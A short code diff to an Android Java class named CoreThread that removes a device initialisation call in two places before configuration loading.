@@ -218,7 +218,6 @@ public class CoreThread extends Activity implements Runnable {
 
 			// Identify the device uniquely
 			final Device device = Device.self();
-			device.init(contentResolver);
 
 			if (!loadConf()) {
 				debug.error("Cannot load conf");
@@ -337,7 +336,6 @@ public class CoreThread extends Activity implements Runnable {
 
 			// Identify the device uniquely
 			final Device device = Device.self();
-			device.init(contentResolver);
 
 			// Load the configuration
 			conf.LoadConfiguration();
